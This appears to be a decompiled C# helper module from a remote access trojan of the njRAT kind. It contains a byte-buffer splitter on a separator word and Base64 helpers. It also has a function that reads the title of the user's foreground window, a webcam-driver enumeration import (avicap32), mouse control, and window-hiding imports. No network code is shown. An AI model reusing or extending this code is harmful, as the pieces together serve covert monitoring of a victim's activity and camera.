using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class e
{
	public enum SW
	{
		Hide = 0,
		Normal = 1,
		ShowMinimized = 2,
		ShowMaximized = 3,
		ShowNoActivate = 4,
		Show = 5,
		Minimize = 6,
		ShowMinNoActive = 7,
		ShowNA = 8,
		Restore = 9,
		ShowDefault = 10,
		ForceMinimize = 11,
		Max = 11
	}

	public enum GetWindowCmd : uint
	{
		GW_HWNDFIRST,
		GW_HWNDLAST,
		GW_HWNDNEXT,
		GW_HWNDPREV,
		GW_OWNER,
		GW_CHILD,
		GW_ENABLEDPOPUP
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	public static string BS(byte[] b)
	{
		return Encoding.Default.GetString(b);
	}

	public static Array fx(byte[] b, string WRD)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(BS(b), WRD, -1, (CompareMethod)0);
		memoryStream.Write(b, 0, array[0].Length);
		checked
		{
			memoryStream2.Write(b, array[0].Length + WRD.Length, b.Length - (array[0].Length + WRD.Length));
			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
	}

	public static string ENB(ref string s)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		return Convert.ToBase64String(bytes);
	}

	public static string DEB(ref string s)
	{
		byte[] bytes = Convert.FromBase64String(s);
		return Encoding.UTF8.GetString(bytes);
	}

	public static string readtext(string l)
	{
		return File.ReadAllText(l);
	}

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	public static string ACT()
	{
		checked
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					return "";
				}
				int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
				string WinTitle = Strings.StrDup(windowTextLengthA + 1, "*");
				GetWindowTextA(foregroundWindow, ref WinTitle, windowTextLengthA + 1);
				int lpdwProcessID = default(int);
				GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
				if (lpdwProcessID != 0)
				{
					try
					{
						return Process.GetProcessById(lpdwProcessID).MainWindowTitle;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						string result = WinTitle;
						ProjectData.ClearProjectError();
						return result;
					}
				}
				return WinTitle;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool IsWindowVisible(IntPtr hwnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
}
